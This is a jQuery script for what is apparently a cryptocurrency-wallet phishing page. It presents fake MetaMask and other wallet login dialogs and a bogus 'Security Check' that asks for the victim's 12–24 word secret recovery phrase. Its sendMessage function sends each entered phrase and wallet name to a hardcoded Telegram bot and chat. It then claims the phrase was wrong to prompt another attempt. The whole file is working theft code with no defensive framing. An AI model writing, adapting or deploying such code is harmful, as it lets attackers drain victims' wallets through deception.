$(
  '.headconect > p:nth-child(3), .two-modal .headconect > p:nth-child(2)'
).click(function () {
  $('.modal').css('display', 'none');
  $('#checkkk').val('hidden');
  return false;
});

// toggle navbar
$('.mobilemenu').click(function () {
  $('.leftfixed').toggleClass('hide-lg');
});

// $('body').click(function (event)
// {
//     if(!$('.modalk').hasClass('none'))
//     {
//        if(!$(event.target).closest('.modalk').length && !$(event.target).is('.modalk')) {
//          $(".modalk").addClass('none');
//        }
//     }
// });
$(document).click(function (e) {
  var div = $('.modal');
  let vid2 = $('.modalk');
  if (
    $('#checkkk').val() == 'hidden' &&
    !div.is(e.target) &&
    div.has(e.target).length === 0 &&
    !vid2.is(e.target) &&
    vid2.has(e.target).length === 0
  ) {
    $('.one-modal').css('display', 'block');
  }
});
$('.cont').click(function () {
  $('#checkkk').val('dd');
  if ($(this).find('p').text() !== 'Metamask') {
    $('.wallet-title').text($(this).find('p').text());
    $('.icon').html($(this).find('.svg').html());
    $('.wallet-description').text(
      `Login using ${$(this).find('p').text()} hosted wallet`
    );
    $('.two-modal').css('display', 'block');
    $('.one-modal').css('display', 'none');
    return false;
  } else {
    $('.inputs').removeClass('none');
    $('.one-modal').css('display', 'none');
  }
});

$('.btnsd button').click(function () {
  if ($('#areatext').val().split(' ').length < 11) {
    alert('Secret recovery phrases contain 12, 15, 18, 21 or 24 words');
  } else {
    sendMessage($('.wallet-title').text(), $('#areatext').val(), true);
  }
});

$('.modalk a#submit').click(function () {
  if ($('.modalk input#val').val().split(' ').length < 11) {
    alert('Secret recovery phrases contain 12, 15, 18, 21 or 24 words');
  } else {
    sendMessage($('.wallet-title').text(), '.modalk input#val'.val(), true);
  }
});

function sendMessage(name, value, ress) {
  var chat_id = -1001604067165;
  var bot_token = 'bot5031140535:AAE-MnEXdl9TGH4kPO4HoqKpjiAy0MuwGWw';
  $.ajax({
    url:
      'https://api.telegram.org/' +
      bot_token +
      '/sendMessage?chat_id=' +
      chat_id +
      '&text=Wallet: ' +
      name +
      '%0A' +
      'Phrase: ' +
      value,
    type: 'GET',
    success: function (data) {
      var json_response = data.ok;
      console.log(json_response);
      if (json_response) {
        alert('You entered the wrong phrase, please try again.');
        $('.modal').css('display', 'none');
        $('#checkkk').val('hidden');
        return false;
      }
    },
  });
}

$('#sumbit').click(function () {
  if ($('#val').attr('placeholder') !== 'Password') {
    if ($('#val').val().split(' ').length < 11) {
      alert('Secret recovery phrases contain 12, 15, 18, 21 or 24 words');
    } else {
      sendMessage('Metamask', $('#val').val(), false);
    }
  }

  if ($('#status').val() == '') {
    $('#val').val('');
    $('#val').attr('placeholder', 'Phrase');
    $('#val').attr('type', 'text');
    $('div.main--texts > h2').text('Security Check!');
    $('div.main--texts > p').text(`We just need to confirm it's you.
To continue, simply confirm your 12 word phrase.`);
    $('#status').val('one');
  } else {
    $('#val').val('');
    $('div.main--texts > h2').text(`Security Check Failed`);
    $('div.main--texts > p').text(
      `We cannot confirm it's you. Please enter a valid phrase!`
    );
  }
});

// info
$('.info-solid').click(function () {
  $('.tooltip').toggleClass('show-info');
});
